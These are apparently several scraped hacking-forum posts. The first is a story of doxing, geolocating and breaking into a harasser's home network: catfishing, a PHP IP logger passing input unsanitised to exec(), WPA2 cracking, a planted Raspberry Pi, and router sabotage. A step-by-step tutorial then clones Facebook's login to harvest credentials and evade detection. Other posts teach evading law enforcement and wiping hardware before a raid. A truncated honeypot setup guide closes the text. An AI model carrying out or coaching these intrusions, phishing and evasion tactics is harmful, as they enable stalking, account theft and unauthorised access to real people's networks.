<p>After assuring your <a href="http://kik.me/MweyaR" rel="nofollow noopener">friend</a> that all will be okay, you text your mutual friend to advise her to block the assailant. Next, you take a look at the information given to you. Although your <a href="http://kik.me/MweyaR" rel="nofollow noopener">friend</a> is no specialist, he tried his best to <a href="https://en.wikipedia.org/wiki/Doxing" rel="nofollow noopener">dox</a> the target. All he got was a list<br>
of usernames the assailant used.</p>
<pre><code>	-- Dox --

Names:		?
Usernames:	@Sm9obiBEb2U=
		@akRhd2c=
		@Sm9obm55RA==
Static IP:	?
Location:	?
</code></pre>
<p>The second you read the usernames, you see a pattern. The equal signs at the end of each username look extremely suspicious. After doing some <a href="http://lmgtfy.com/Base64" rel="nofollow noopener">research</a>, you try deciphering them (base64).</p>
<p>You copy and paste the usernames into your <a href="https://duckduckgo.com/" rel="nofollow noopener">search engine</a>. Gibberish is returned. Next, you decide to separate the usernames from the ‘at’ signs.</p>
<pre><code>	@Sm9obiBEb2U=       --&gt;     Sm9obiBEb2U=
	@akRhd2c=	    --&gt;     akRhd2c=
	@Sm9obm55RA==       --&gt;	    Sm9obm55RA==
</code></pre>
<p>Bingo.</p>
<pre><code>Sm9obiBEb2U=       --&gt;     John Doe
akRhd2c=	   --&gt;     jDawg
Sm9obm55RA==       --&gt;	   JohnnyD
</code></pre>
<p>Knowing his alias, you decide to say hi and try to get some more info out of him. You don’t want to scare him off or let him<br>
know who you are, so you make another account (by getting an email address from another provider like <a href="http://iway.na" rel="nofollow noopener">Iway</a> or <a href="https://0x00sec.org">Gmail</a>) for messaging him.</p>
<p>Once logged in, your profile rich with misinformation, you send the message, “Hey x.”</p>
<p>Within mere seconds, he replies and you two start chatting. You boot up your laptop and go to an <a href="http://blasze.tk" rel="nofollow noopener">IP logging</a> service. After following the onscreen prompts, you get a link. To avoid arousing suspicion, you head onto the <a href="http://goo.gl" rel="nofollow noopener">Google URL Shortener</a>.</p>
<p>To avoid false-positives, you look at the clicks on your logging URL and notice that two Google services have clicked on it.<br>
You write down those IP addresses to avoid messing with the wrong servers. Finally, you send the link to John Doe.</p>
<p>“Lmao, a logger? Really?” is the reply.</p>
<p>You block John Doe and decide to retry the social engineering approach.</p>
<p>You make another account with a new email and alias. This time, you pick another logging service with a less conspicuous name and almost no trace on Google. You do this by getting an old device running <a href="https://www.google.co.za/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=3&amp;cad=rja&amp;uact=8&amp;ved=0ahUKEwj7lJu7v4bNAhUsAcAKHT0-AB0QFggiMAI&amp;url=https%3A%2F%2Fwww.digitalocean.com%2Fcommunity%2Ftutorials%2Fhow-to-install-linux-apache-mysql-php-lamp-stack-on-ubuntu-14-04&amp;usg=AFQjCNFMs2tFcDvIKQSj-FG-MetmnBjf-Q&amp;bvm=bv.123325700,d.d2s" rel="nofollow noopener">Apache</a> (computer or phone (in chrooted Kali), depending on if you know what you’re doing or not) and by buying an inconspicuous domain like ‘<a href="http://UrbanDicktionary.com" rel="nofollow noopener">UrbanDicktionary.com</a>’. Your homepage (index.php) looks like this:</p>
<pre><code class="lang-php">&lt;!-- This runs the Python3 script --&gt;

&lt;?php

$ip = $_SERVER['REMOTE_ADDR'];
echo exec("SuperCoolPythonScript ".$ip);

?&gt; 

&lt;!-- This redirects the assailant to the real site --&gt;
&lt;script type="text/javascript"&gt;window.location="http://urbandictionary.com"&lt;/script&gt; 
</code></pre>
<p>The homepage first takes the visitor’s IP, then runs a Python script (called SuperCoolPythonScript) with the visitor’s IP as an argument.<br>
The Python Script looks like this:</p>
<pre><code class="lang-python">#! /usr/bin/python3

</code></pre>
<p>The Python script takes the IP passed to it as an argument and then proceeds to use a free JSON service (<a href="http://ipinfo.io" rel="nofollow noopener">ipinfo.io</a>) to look it up before performing a primitive port scan. The results are logged in a file called “Skids.txt”.</p>
<p>After setting everything up, you decide to shift your conversation to weird redirects like <a href="http://loser.com" rel="nofollow noopener">loser.com</a> and <a href="http://UrbanDicktionary.com" rel="nofollow noopener">UrbanDicktionary.com</a><br>
He is reluctant at first, but eventually clicks the link. The IP address and his GPS coordinates are saved.</p>
<p>“That’s weird,” you think as you paste his GPS coordinates into <a href="https://0x00sec.org">Google Maps</a>.</p>
<p>While making sure that your info is accurate, using <a href="https://0x00sec.org">Shodan</a>, and making sure you didn’t pick up the wrong IP by means of a “<a href="https://who.is/" rel="nofollow noopener">whois</a>”, you realize that you got very lucky. John Doe is using mobile data, and the location of the IP is not his ISP’s server.</p>
<p>John Doe seems to be in a house a few blocks away from you. Therefore, you decide to pay him a visit.</p>
<p>You grab your car keys, laptop and an <a href="http://www.aircrack-ng.org/doku.php?id=compatible_cards" rel="nofollow noopener">AirCrack-ng-compatible WiFi card</a>. You drive past his house before parking a block away.<br>
To avoid being detected, you turn off your car’s lights. Then, you turn your head and stare into the inky night at what might be John’s house. The house looks like a typical, two-story suburban house with white walls, a large fence-less yard and an American flag flying from the second floor.</p>
<p>You press the power button and wait for your laptop to boot into <a href="http://www.weaknetlabs.com/" rel="nofollow noopener">WeakerThan 7</a>. Once it boots, you plug in your network card, make sure it’s detected by running <code>ip link</code>, and then start <a href="http://weaknetlabs.com/warcarrier/" rel="nofollow noopener">WarCarrier</a>. You follow the on-screen prompts to start scanning, wait for the onboard GPS to connect and start the slow drive around the block. You pass the expected house, but knowing how inaccurate GeoIP is, you keep circling the block. You pass every house you can see before looking<br>
at the time – it’s 1 AM; you go home.</p>
<p>The next day you look at the data collected by WarCarrier. It picked up multiple SSIDs and a couple of Bluetooth phones, one which was called “J0hn Ph0ne”. The phone’s icon on the map was very close to one access point, one which seemed isolated from the rest. The house of the SSID seemed to be as expected, with it’s white walls and fence-less garden.</p>
<p>The network’s security is WPA2, so you decide to pay John another visit. You  park the car two blocks away and then wait for nightfall. Then, you disembark and lock the car before walking towards his house, stopping just before. You find a secluded spot and pull out your rooted Android cellphone with <a href="http://forum.xda-developers.com/showthread.php?t=1872752" rel="nofollow noopener">Debian and AirCrack-ng</a> installed.</p>
<p>You find your <a href="https://0x00sec.org">wordlist</a>, get comfortable and <a href="http://null-byte.wonderhowto.com/how-to/hack-wi-fi-cracking-wpa2-psk-passwords-using-aircrack-ng-0148366/" rel="nofollow noopener">wait until you find the hash.</a> (Although it could be easier if you get <a href="https://www.google.com.na/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=2&amp;cad=rja&amp;uact=8&amp;ved=0ahUKEwiDmKuM7-HNAhXqKsAKHbXeDjMQFggpMAE&amp;url=http%3A%2F%2Fforum.xda-developers.com%2Fshowthread.php%3Ft%3D2233282&amp;usg=AFQjCNFa2SVLACKF165fzbhhtMdzjdeg5Q&amp;sig2=rLQPyU3xMQiqWTJTsLafqA" rel="nofollow noopener">this</a> working…)</p>
<p>Once you see the "WPA Handshake: " prompt, you revert the changes made to your network card and SSH into the server you used previously. After installing Aircrack-ng with a quick <code>apt-get install aircrack-ng</code>, you upload your hash using<br>
an <a href="https://play.google.com/store/apps/details?id=turbo.client&amp;hl=en" rel="nofollow noopener">SFTP program</a>, and you <a href="http://null-byte.wonderhowto.com/how-to/hack-wi-fi-cracking-wpa2-psk-passwords-using-aircrack-ng-0148366/" rel="nofollow noopener">start cracking the hash</a>. You leave your spot and drive home for the meantime.</p>
<p>As you arrive, you get a notification that the hash has finished cracking; The password is, “hackme”. Now, you set up a <a href="https://www.raspberrypi.org/" rel="nofollow noopener">Raspberry Pi</a> with a network card and power supply. You await sundown before visiting John once more.</p>
<p>This time, you connect your Pi and phone to the WiFi using the freshly-cracked credentials. You <a href="http://www.instructables.com/id/How-to-Spoof-Your-MAC-Address/" rel="nofollow noopener">spoof your MAC addresses</a> and look for a login page to the router. Finding it, you log in using the password from the access point. From the web menu, you<br>
forward port 22 to your Raspberry Pi. You then <a href="https://www.blackmoreops.com/2014/06/19/kali-linux-remote-ssh/" rel="nofollow noopener">set up an SSH Server</a>, make sure your PI won’t run out of power,  and then leave it there.</p>
<p>You decide to make an <a href="http://zeronte.bluesimplex.com/80/" rel="nofollow noopener">SSH tunnel</a> and use the router’s settings to mess with his internet connection, delete his ADSL login details, and then change the router’s password.</p>
<p>After all this strenuous work, you send a single text to your old <a href="http://kik.me/MweyaR" rel="nofollow noopener">friend</a>:</p>
<p>“I got him. He won’t be a problem anymore.”</p>

          <title>A Hacker&#39;s Methodology - 4 Keys to Becoming Successful</title>
          <dc:creator><![CDATA[Merozey]]></dc:creator>
          <category>Social Engineering</category>
          <description><![CDATA[
            <h1>A Methodology</h1>
<p>As you may have seen OTW describe in the past back at the despicable NB, as a hacker you must know these 6 steps to penetrate a system successfully:</p>
<ol>
<li>Passive Reconnaissance</li>
<li>Active Reconnaissance</li>
<li>Footprinting &amp; Enumeration</li>
<li>Exploitation</li>
<li>Privilege Escalation</li>
<li>Covering Your Tracks</li>
</ol>
<p>As critical as these steps are – any self-respecting hacker should understand these steps – one must also be aware that, as a hacker, there are a few more things to have under one’s belt…</p>
<hr>
<h2>Key 1: Anonymity</h2>
<hr>
<p>As many of you may already know, <strong>anonymity</strong> is something about which I care very much – and it’s very important that a hacker maintain his/her anonymity. For those hackers seeking a “darker path,” being anonymous is even more crucial, an important step in avoiding cuffed wrists.</p>
<p>When you’re browsing the internet through your many aliases, it’s paramount that no two aliases collide. This includes clear distinctions between <strong>language patterns, time zones,  discussion topics, who you talk to, and what you do</strong> under each alias. Such diligence demands much skill, focus, and vigilance. Avoid any distraction that could potentially lead to the corrupting of an alias.</p>
<p>Many known hackers behind bars today were tracked down simply because they overestimated their anonymity; they didn’t put enough effort into remaining anonymous. You need to constantly look for where you are “slacking,” so to say, and improve, because anonymity is a very broad, multi-faceted subject.</p>
<hr>
<h2>Key 2: Social-engineering</h2>
<hr>
<p>Often I make note of Social Engineering’s rise to prominence. We’re living in a world in which Internet can be a very dangerous place, and the dangers can be anywhere: websites, forums, chat rooms, and so on. Even to me this is frightening.</p>
<p>I therefore advise all hackers and security enthusiasts to be aware of how important this threat is. <em>Social Engineering is primarily about persuasion.</em></p>
<p>In order to hone this magnificent skill, one must know his target: who they talk to, their interests and hobbies, friends and families. Then, one must be able to effectively use this information against his target. One may do this in order to obtain user credentials.</p>
<p>In today’s world, the IT Industry is a big part of our daily lives; there are many people capable of skills like Social Engineering. Under the right circumstances, a malicious Social Engineer could even dupe the best of us. I believe the weakest link in any system, is always the human being itself.</p>
<p>Future generations will increasingly become victims of SE; therefore, it is important that the populace is educated about threats lingering as a result of Social Engineering.</p>
<hr>
<h2>Key 3: Scripting</h2>
<hr>
<p>Any hacker intent on progressing should have between one and two programming languages under his/her belt. Without this skill, one’s attacks rely solely on the tools built by others, which means that a particular exploit may be in the hands of <em>other</em> unskilled hackers. Such exploits have likely been reported to all relevant Law Enforcement and Security entities already, so using one would be a waste of time and land an eager hacker with a fine or jail time.</p>
<p>Programming knowledge is also beneficial to one’s creative- and problem-solving skills. A better problem solver can perform better hacks. Understanding of programming also makes it easier to exploit existing software. For this, one may receive a Bug Bounty, a payday, if he/she reports it accordingly.</p>
<hr>
<h2>Key 4: Certifications</h2>
<hr>
<p>Any hacker should seek to hold many of today’s respected certifications, which greatly increase one’s chances of landing a job in the IT-industry.</p>
<p>While some may wish to keep hacking a hobby, I advise that you do not let your skills go to waste because there are many high-paying jobs available in the Cyber Security industry.</p>
<p>Certifications also can boost your confidence and credibility. You can show it to your entourage so they can see how skilled you are. Furthermore, it can be used as a reminder that you are capable of exploiting things and writing valuable code, even though you might be struggling at times.</p>
<hr>
<h1>Conclusion</h1>
<hr>
<p>All of these keys now in mind, I hope you’ve learned something today.</p>
<p>P.S. While I am on vacation at the moment, I aim to keep contributing, although at a lesser frequency.</p>

          <dc:creator><![CDATA[the_c0nd0r]]></dc:creator>
          <category>Social Engineering</category>
          <description><![CDATA[
            <h1>Introduction</h1>
<p>Hello Everyone! I am <a class="mention" href="https://0x00sec.org/u/the_c0nd0r">@the_c0nd0r</a>. This is my first post here…so…wohooo!! This post is going to be a little illustrative. Although in the future posts, I’ll keep it short and up to the point so that it doesn’t become boring.</p>
<hr>
<p>Alright! Today, we will be setting up a fake <strong>Facebook</strong> login page to get our victim’s credentials. The method we are going to use is the <strong>Credential Harvester</strong> method and we will be using the <strong>Social Engineering Toolkit</strong> (present in Kali Linux) for the same. The process itself is very easy to implement and if the victim is not alert enough to notice the URL, he/she will fall in and end up being <a href="http://haveibeenpwned.com" rel="noopener nofollow ugc">pwned</a>.</p>
<p>Note: I have made hyperlinks for the terms which new users might find difficult to begin with. Alternatively, <a href="http://google.com" rel="noopener nofollow ugc">google</a> things you fail to understand and look up different sources. <span class="mention">@unh0lys0da</span> has already made a <a href="https://0x00sec.org/t/activating-turboboost-are-you-skidding-me/590/">point</a> on that.</p>
<hr>
<h2><strong>What you’ll need:</strong></h2>
<ol>
<li><a href="https://www.kali.org/" rel="noopener nofollow ugc">Kali Linux</a></li>
<li>A little background on Networking and its terms (Private vs Public IPs esp.) would be good.</li>
<li>This one is obvious-&gt; You should be online.</li>
</ol>
<hr>
<h2><strong>The Demonstration:</strong></h2>
<p>I’ll use a live Kali Linux session on <a href="http://virtualbox.com" rel="noopener nofollow ugc">VirtualBox</a> with <a href="https://www.virtualbox.org/manual/ch06.html#network_bridged" rel="noopener nofollow ugc">Bridged Networking Mode</a>. My host machine is Windows 10 (I’ll use it as the victim’s machine - <em>and i’ll be a super dumb user!</em>).</p>
<h2>STEP 1: Check the Network settings in VirtualBox</h2>
<p>The Attacker and the Victim should be on the same network. Here, the victim’s Windows 10 and the attacker’s Kali are on the same Wi-Fi network so we are using Bridged Networking. <strong>This is how it looks:</strong></p>
<p><img src="//0x00sec.s3.amazonaws.com/original/1X/35faeb1ef212c6f8b9df731593a2dfdd5b08cf5b.png" width="690" height="427"></p>
<h2>STEP 2: The setoolkit</h2>
<p>Go to <strong>Applications &gt; Kali Linux &gt; Exploitation Tools &gt; Social Engineering Toolkit &gt; setoolkit</strong></p>
<p><img src="//0x00sec.s3.amazonaws.com/original/1X/c6b83cb68f7746b754a12c3a0cfff348ead3177f.png" width="690" height="498"></p>
<p>Alternatively, in terminal, you can type: <em>setoolkit</em></p>
<h2>STEP 3: Let’s get our hands dirty – for real!</h2>
<p>Now, you will get a prompt asking you to agree to the terms and conditions (if you are running it for the very first time). Enter y and move on!</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/1X/843255c45d76bf8711fabe0bfc659de12b73d2ed.png" width="690" height="439"></p>
<p>You get this menu now:<br>
<img src="//0x00sec.s3.amazonaws.com/original/1X/454f9af89ebe9f73aab93539cd577205d605a98f.png" width="690" height="441"></p>
<p>The 1 selects social engineering attacks. Obvious choice if you read the other options from 1 to 9 (and 99 for exit)</p>
<p>Then, we get this menu:</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/1X/d57b3835e898c384a5ffd689c9a660c57ef9284f.png" width="690" height="450"></p>
<p>The 2 selects Website Attack Vectors. Not that obvious.  The Web Attack module is a unique way of utilizing multiple web-based attacks in order to compromise the victim.</p>
<p>We have this menu now:<br>
<img src="//0x00sec.s3.amazonaws.com/original/1X/a5f1cf4271093a4e4cc609440949d262f178a9d3.png" width="690" height="446"></p>
<p>The 3 selects Credential Harvestor.  The Credential Harvester method will utilize web cloning of a web-site that has a username and password field and harvest all the information posted to the website.</p>
<p>Now we’ll be cloning the login page:</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/1X/fe35761771506066e5a5c60ae7510da2586bcaf5.png" width="690" height="447"></p>
<p>Now that is obvious!</p>
<p>Next we find the IP of our machine:</p>
<ol>
<li>Open a new terminal window.</li>
<li>Type: <em>ifconfig</em>
</li>
<li>Since all the VMs in VirtualBox use a Virtual Ethernet Adapter, so Bridged mode would bridge your Wi-Fi’s connection to the VM through the Virtual Ethernet and all the machines on the Wi-Fi Network would be accessible. So, the Private IP appearing in the <em>eth0</em> category is what we want to know here:</li>
</ol>
<p><img src="//0x00sec.s3.amazonaws.com/original/1X/7deb690ec5960e1ea466bb946b61ab43ee8ac415.png" width="690" height="446"></p>
<p>Now we have a prompt for entering the Harvester’s IP in the setoolkit(We will enter our IP used on the network):</p>
<p><em>set:webattack&gt; IP address for the POST back in Harvester/Tabnabbing:</em> <em><strong>192.168.XXX.XX</strong></em></p>
<p>There we go! Now press enter. We have the following prompt now:</p>
<p><em>set:webattack&gt; Enter the url to clone: <strong><a href="https://www.facebook.com/" rel="noopener nofollow ugc">https://www.facebook.com/</a></strong></em></p>
<p>We enter facebook’s URL here.<br>
Press Enter again.</p>
<p>Now, if the<a href="https://en.wikipedia.org/wiki/Apache_HTTP_Server" rel="noopener nofollow ugc"> Apache Web Server</a> is not running, <em>setoolkit</em> will ask for your permission. Simply enter y and proceed.</p>
<h2>Finally, you should have this on your terminal:</h2>
<p><img src="//0x00sec.s3.amazonaws.com/original/1X/71ca58666003fafb5e45f302cc14ad58d9fe90aa.png" width="690" height="446"></p>
<p>Now we will try to see if this works.</p>
<h2>STEP 4: The Victim’s Desktop</h2>
<p>Now to get the victim to open your site, you’ll need to work out something. If he/she is on Windows, edit the hosts file to redirect <a href="http://facebook.com" rel="noopener nofollow ugc">facebook.com</a> to your machine’s IP. You’ll have to think of that since I can’t be situation specific here. I am going to use my Host OS to open the site.</p>
<p>dumb_c0nd0r enters 192.168.XXX.XX in the address bar…</p>
<p>He then gets the fake Facebook login page:<br>
<img src="//0x00sec.s3.amazonaws.com/original/1X/51b750b9b23a4b3c105c910cdf2d9b36eafed0ce.png" width="690" height="355"></p>
<p>He enters his email and password.</p>
<p>On pressing enter, he is redirected to the original facebook login page. He thinks he accidentally refreshed the browser and re-enters his credentials but dumb_c0nd0r failed to realise that he got <strong>pwned</strong>. Poor man!!!</p>
<p>Getting the credentials:</p>
<ol>
<li>Open up a terminal window.</li>
<li>Type the following commands:<br>
<em>cd /var/www/</em><br>
<em>ls</em>
</li>
<li>You should see your harvester file in there. Type: nano harvester [press TAB to complete the filename]</li>
</ol>
<p>Look for these two fields:</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/1X/738ec270b6435aefec054af640a2950fecbc5538.png" width="690" height="443"></p>
<p>So there you have it! The account is <strong>compromised</strong>.</p>
<hr>
<h2><strong>Avoiding such a hack:</strong></h2>
<p>Educating the people is the key here because even if you use all the latest anti phishing software the user could still be the weakest link by opening a link that comes from an unknown origin.They must be aware about what is phishing, not to open any links and to put their details and to always check the address bar and things that would not look normal in order to avoid being scammed.</p>
<h2><strong>Going a step ahead:</strong></h2>
<p>If you want to this to work online, you’ll have to<a href="http://portforward.com" rel="noopener nofollow ugc"> port forward</a>. Then use <a href="http://noip.com" rel="noopener nofollow ugc">no-ip</a> or <a href="http://goo.gl" rel="noopener nofollow ugc">shorten the URL</a> or do something similar to evade detection. Further reading on this: <a href="https://informationtreasure.wordpress.com/2014/07/25/credential-harvestor-port-forwarding-phishing-facebook/" rel="noopener nofollow ugc">Click Here</a></p>
<h2>Skid’s feed:</h2>
<p>As far as they are concerned &gt;</p>
<blockquote>
<p>Isn’t there a tool where I could enter the User ID and pwn the account? HUH???</p>
</blockquote>
<p>Well, the answer is <a href="https://informationtreasure.wordpress.com/2014/07/25/hack-facebook-account-stuff-you-should-know/" rel="noopener nofollow ugc">this</a>.</p>
<hr>
<h2>I’ll be posting more articles in the future. Hope you enjoyed it!</h2>
<hr>
<p>EDIT: Similarly, we can make phishing pages for Gmail, Yahoo etc. by using Web Templates after selecting the Credential Harvester option. It all depends on how creative you are!</p>

          <title>How to Become a Ghost Hacker - Merozey&#39; Tips</title>
          <dc:creator><![CDATA[Merozey]]></dc:creator>
          <category>Social Engineering</category>
          <description><![CDATA[
            <p><strong>BRACE YOURSELVES</strong> because, this is a very long post and, i’ve gathered my pasts pointers to this entire topic and, with social-engineering being one of my primary special endeavors, I have now decided to give all of my pointers to you in one page. There are a lot that’s been covered, so i’m sure a thing or two has been missed.</p>
<p><strong>Sorry for my absence</strong><br>
Life’s rough as we all know, we all have things to go through and I recently did - which I still am. But, it’s now manageable, thanks to several people.</p>
<p>**</p>
<h2>Being Quiet</h2>
<p>**<br>
When I say this, I mean it in any possible way. Do NOT say a single word about your hacking life. Don’t even mention the word. The key to people not thinking you are a hacker is to never go in that area. If one day you pull of a great hack, and you didn’t cover all of your tracks, and the feds show up in your neighborhood to question your  friends, they are obligated to tell the truth or they’ll be interfering with a federal investigation. But they can’t lie if they don’t know the truth.</p>
<p>That is of course a very drastic measure to take but, some hackers, possibly <em>black</em> <em>hat</em> <em>hackers</em> do take this measure very seriously and, most definitely members of <em>Anonymous</em>, since it’s an illegal movement. With the exception of their ISIS operations.</p>
<ul>
<li>
<strong>Conclusion</strong><br>
Don’t tell your friends, family or loved ones, or you’ve put your secret identity in their hands too.</li>
</ul>
<p>**</p>
<h2>Don’t Put a Name to Yourself</h2>
<p>**</p>
<p>What I mean here is, most hackers love attention. Take a look at Lizard Squad for example. They share the hacks they complete. Doing so, you give everybody the chance to communicate with you, because having a social media profile is for everybody in the whole world who wishes to, can be able to communicate with you. incl. feds. So, don’t put a name to yourself.</p>
<p>It also provides the ability for LE to watch you, whether you have 10 hops or 3 hops, it doesn’t matter because eventually you’ll make a mistake, whether or not that mistake is something you can afford is unclear. So, by having this public profile, anyone can ‘attack’ your profile and spy on you until that person makes a mistake.</p>
<ul>
<li>
<strong>Become a Ghost Hacker</strong><br>
Ghost hackers are hackers who constantly changes his alias. No one can ever really get in contact with him, and he never is one place too long.This gives many advantages, as it being much harder for anyone to track you down. A good example would be Elliott from Mr. Robot. He doesn’t tell anyone about his hacks, and doesn’t put a name to himself.</li>
</ul>
<p>**</p>
<h2>Communication Methods</h2>
<p>**</p>
<p>A key part to anonymization is a secure communication method. There are so many different software’s that provides you several ways of talking securely to one another. However the one major down side is you are putting your identity in the hands of a company you do not know personally. This is very bad because, you do not know if they are actually being truthful on what they are providing.</p>
<p>We have seen this before with HideMyAss (VPN service) who was approached by US and, had to hand over information on a specific user, however HideMyAss claimed not to keep logs from its users, but yet they were able to hand over information on a specific user. That is a perfect example, because even though a company states something, that doesn’t mean its entirely true. Likely it is, but know that this company might be non-profit which means they can do whatever they want, or you didn’t read their Terms of Service and therefore don’t know, that there are exceptions towards certain services to a company, which then results in a company handing over your data to the government.</p>
<p>I want you to know that even though a company is stating something, do some investigation. Ask around, read reviews, read their Terms of Service and Privacy Policy. (Yes im not kidding)</p>
<ul>
<li>
<strong>Key things to look for in a communication method:</strong><br>
Check if they provide strong encryption<br>
Read the customers feedback<br>
InvestigateRead ToS &amp; Privacy Policy</li>
</ul>
<p>**</p>
<h2>Aliases</h2>
<p>**</p>
<p>I mentioned that you should become a ghost hacker. A ghost hacker is someone who never uses the same name for everything. He constantly changes alias and, doesn’t stay in one place for too long, which gives him many advantages such as FBI not knowing where or who to look for. I want to point out that this also applies to all your accounts that you own, if you have an instagram &amp; twitter account with the same alias, FBI &amp; NSA and, any skilled hacker will be able to link them together because of the same alias has been used, and trust me that is not hard to do.</p>
<p>There is not much else to explain because, generally this should be common sense to anyone who understands the basics of anonymity and so, this is usually a precaution that people take. Probably even journalists does this when communicating with hackers or anyone using the deep web etc.</p>
<p>**</p>
<h2>VPN Providers</h2>
<p>**</p>
<p>This is an obvious one, however many newbies ask the common question on “<em>What VPN should I purchase?</em>” and, “<em>If I have to remain anonymous, why should I then pay for one?</em>”. I will now clarify these two questions.</p>
<p><strong>Question 1:</strong> This will and, I repeat, WILL depend on your current location. If you are located within the US, it would be smart to fool your country thinking you are in China or Russia.</p>
<p><strong>Question 2:</strong> This is because, if you don’t pay for your product, you are the only product being sold. A company needs money, and it costs money to keep their servers up and, they have families to feed, so why would they provide you and, everybody else a really good software that anonymizes you, when they can charge for it? We live in 2016, and you need to remember that everything is about money now. Thats how it works as sad as it may sound to some of you. We need money to run things and, a successful firm can’t keep their service secure if they don’t have any money to that.</p>
<ul>
<li>
<strong>Additional precautions:</strong><br>
Again read ToS &amp; Privacy Policy (Yes, you have to)<br>
Make sure they are not located in USA.<br>
Strong encryption<br>
Read customers feedback</li>
</ul>
<p><strong>Second precaution:</strong> This is because if you have a company in USA then USA will have complete jurisdiction over the company and the company will have to abide by US laws.As many of you know, other countries have better privacy laws, such as Sweden and Switzerland and, they will therefore be a better advantage. Also FBI &amp; NSA have<br>
headquarters in US which are the main 2 companies wanting to have all your information, but they have no power of getting such information if your VPN provider is located in Russia for example, because America doesn’t have any jurisdiction there.</p>
<ul>
<li>
<strong>BEWARE</strong>: Some companies have many servers spread through many countries and, these will sometimes include America. Know that if you sign up for this VPN, you<br>
could end up on the server they have in US and, therefore they have the right to demand information from that particular server.</li>
</ul>
<p>**</p>
<h2>Provide False Information</h2>
<p>**</p>
<p>Many things fall into place when one has to successfully become a ghost hacker and, one of<br>
the key things is what you’re telling people. When you are communicating online, you have two options. Either don’t say anything at all, or give them completely false information. Going with option one will most definitely spark interest to people whose intentions are to bring hackers to justice, so you might as well give them what they want but, you didn’t guarantee them that would you’re giving them will be correct information. That’ll be their job to determine, so let’s make it very difficult for them. And it’s important that you don’t reveal anything that can be remotely be connected to you in any way what so ever. It’s difficult but, it’s great to take these types of measures if you have to. For example Dead Pirate Roberts did this too I have been informed.</p>
<p>**</p>
<h2>Your Timezone</h2>
<p>**</p>
<p>This is also very important that you keep it a secret to everybody. Now this is where it can get very complex, because we all have jobs and, education probably, and family friends and so on. So in the end you’ll only have a few hours a day to come on your secret identity, so to get online at completely random times will be a tough task for some because of that. But for those who have that possibility shouldn’t take it for granted. Your buddies will not be able to determine where in the world you live if you come online at completely random time, with no pattern at all.</p>
<p>**</p>
<h2>Wiping Everything</h2>
<p>**</p>
<p>You also have to keep in mind that, even the best can be exposed to unexpected situations and so, you could find yourself in a situation where you have minutes to rescue your future. So, you’ll have to be prepared to DoD your hardware if you should have to, this is what most black hat hackers do when they find out they’ve been raided. If they’re lucky enough (or skilled enough) to find it before their door gets busted in.</p>
<p>**</p>
<h2>Strong Encrypted Passwords</h2>
<p>**</p>
<p>Next up is passwords. Again, the smart ones will only use one password for each account, and never re-use it. This way you again exclude the possibility of one being able to link two accounts together. Again a paranoia measure you can choose to do if you are paranoid like that. I don’t judge.</p>
<p>**</p>
<h2>Language Patterns</h2>
<p>**</p>
<p>Next up is the way you speak. This is the most crucial step when becoming a ghost hacker, because you can determine a lot by the way one types, and with 2016 now being here, we have very smart people being able to determine various things out from just how one types and or speaks, therefore this is very important you understand this step. I’ll elaborate.</p>
<p>Say you have 2 different aliases, and if you truly want to make sure no one is thinking you are the same individual, type differently than you usually type. This includes words you wouldn’t usually include in your vocabulary, and maybe make certain spelling mistakes. By doing this you are giving people an idea of who your alias is, and if you continue to type in that way, they won’t even begin to think if this account they came across on eBay, speaking very sophisticated is in some way connected to this account on craigslist, typing with basic grammar.</p>
<p>**</p>
<h2>Creating an Identity</h2>
<p>**</p>
<p>The goal for the multiple aliases, and additional steps taken here, are to create a character to the people you are speaking to. Because when you are sitting behind your screen, you obviously don’t know who is sitting on the other end and, therefore you might as well fill this persons head with a completely false idea of who you actually are in real life. This gives great advantages such as if the FBI should stop by and question that individual, he’ll be describing someone completely different, and maybe someone who doesn’t even exist. Who knows.</p>
<p>**</p>
<h2>Knowing When to Leave</h2>
<p>**</p>
<p>As a ghost hacker you also need to know that you can still upset some people, and make some enemies, and a wise ghost hacker do not wish to be in such situation. You need to know when danger is headed to your door, and if even the slightest sign of ‘shadyness’ is present, you have to leave your alias. As I have also mentioned earlier, ghost hackers never stays one place for too long, and a perfect example of such scenario is if danger has occurred. By ‘discarding’ your alias, you never log onto it again and never talk to the people you knew under that alias on a different alias, otherwise they’ll be suspicious.</p>
<p><strong>Closing</strong></p>
<p>I hope you’ve learned a lot, I decided to take a few pointers out because, I didn’t feel they were worthy enough. These pointers are useful, so I advise you all to remember them.</p>

          <title>Trap the Hackers! Kippo SSH Honeypot</title>
          <dc:creator><![CDATA[L3akM3-0day]]></dc:creator>
          <category>Social Engineering</category>
          <description><![CDATA[
            <h2>Introduction</h2>
<hr>
<p>Hello to all of the Hackers ! I’m back for a new Tutorial. I’m sorry for the long delays of this tutorial to come.<br>
But let’s get started !</p>
<h3>What is a Honey pot ?</h3>
<p>Before we start to delve into the Tutorial here some informations about what is Honeypot</p>
<blockquote>
<p>Honey Pot Systems are decoy servers or systems setup to gather information regarding an attacker or intruder into your system. It is important to remember that Honey Pots do not replace other traditional Internet security systems; they are an additional level or system.</p>
</blockquote>
<p><em>Source</em> : <a href="https://www.sans.org/security-resources/idfaq/what-is-a-honeypot/1/9" rel="noopener nofollow ugc">What is a Honeypot SANS.org</a></p>
<p>So with a Honey pot we can trap Hackers ( and script kiddies ) and learn more about how they try to hack your server and what kind of automated hack they do.</p>
<p><em>If you want to analyse how hackers do their hacks, I hope you have a little server on the internet <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></em></p>
<h2>Setup the Honey Pot : SSH Honey pot a.k.a Kippo</h2>
<hr>
<p>Now that you know what is an Honey pot , time to start your installation !</p>
<h3>Install your Honeypot</h3>
<p>update and upgrade your system</p>
<pre><code class="lang-bash">apt-get update
apt-get upgrade
</code></pre>
<p>Download the dependencies needed</p>
<pre><code class="lang-bash">apt-get install python-dev openssl python-openssl python-pyasn1 python-twisted 
</code></pre>
<p>download kippo</p>
<pre><code class="lang-bash">git clone https://github.com/desaster/kippo
</code></pre>
<p>Create a new user</p>
<pre><code class="lang-auto">useradd kippo
</code></pre>
<p><em>kippo won’t run if you try to launch it with a root account</em></p>
<p>move your the kippo folder to your new user home directory</p>
<p>The installation is done.</p>
<h2>Configure your Honey Pot !</h2>
<hr>
<h3>Configure your SSH access</h3>
